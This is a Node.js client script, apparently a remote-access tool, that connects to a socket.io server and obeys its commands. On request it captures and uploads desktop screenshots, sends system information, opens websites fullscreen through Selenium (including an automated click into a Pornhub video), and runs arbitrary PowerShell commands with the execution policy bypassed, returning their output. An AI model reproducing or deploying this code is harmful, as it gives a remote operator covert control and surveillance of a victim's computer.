const path = require('path')
const io = require('socket.io-client');
const ss = require('screenshot-desktop');
const {v4: uuidv4} = require('uuid');
const {getDriver} = require('./drivers');
const {getSystemInfo} = require('./systemInfo');
const {By, until, key} = require('selenium-webdriver');
const ks = require('node-key-sender');
const {exec} = require('child_process');
const Shell = require('node-powershell');

const socket = io('http://localhost:3000/clients');

socket.on('connect', () => {
    console.log('Connected')
});

socket.on('disconnect', () => {
    console.log('Disconnected') // false
});

socket.on('screenshot', () => {
    ss({format: 'png'}).then((img) => {
        const filename = `${uuidv4()}.png`;
        socket.emit('get_screenshoot', {img: img, filename: filename})
    })
})


socket.on('website', (data) => {
    (async () => {
        const driver = await getDriver();
        await driver.manage().window().maximize();

        try {
            if (data.findInGoogle && data.findInGoogle === 'on') {
                await driver.get("https://duckduckgo.com/");
                const searchInput = await driver.findElement(By.id('search_form_input_homepage'));
                const searchBtn = await driver.findElement(By.id('search_button_homepage'))
                await driver.wait(until.elementIsVisible(searchInput), 1000)
                await searchInput.sendKeys(data.url);

                setTimeout(() => {
                    (async () => {
                        await driver.wait(until.elementIsVisible(searchBtn), 1000)
                        await driver.manage().addCookie({
                            name: 'l',
                            value: 'pl-pl',
                            domain: 'duckduckgo.com',
                            secure: true
                        });
                        await searchBtn.click();

                        await driver.wait(until.elementIsVisible(driver.findElement(By.xpath('//div[@id="r1-0"]'))), 1000).click();
                        const title = await driver.getTitle()

                        // Sprawdzamy czy jestesmy na stronie ph
                        if (title.search('Pornhub')) {
                            await driver.wait(until.elementIsVisible(driver.findElement(By.xpath('//li[@class="pcVideoListItem  js-pop videoblock videoBox"]'))), 1000).click();
                        }
                    })();
                }, 2000);
            } else {
                await driver.get(data['url']);
                ks.sendKey('f11');
            }
        } finally {
            socket.emit('website')
        }
    })();
})

socket.on('systemInfo', () => {
    (async () => {
        console.log('Manager chce info o systemie');
        const data = await getSystemInfo();
        // Przesylamy info do servera
        socket.emit('systemInfo', data);
    })();
})

socket.on('command', (data) => {
    const ps = new Shell({
        executionPolicy: 'Bypass',
        noProfile: true
    })

    ps.addCommand(data.command);
    ps.invoke()
        .then(response => {
            socket.emit('command', {message: response});
        })
        .catch(error => {
            socket.emit('command', {message: JSON.stringify(error)});
        })
});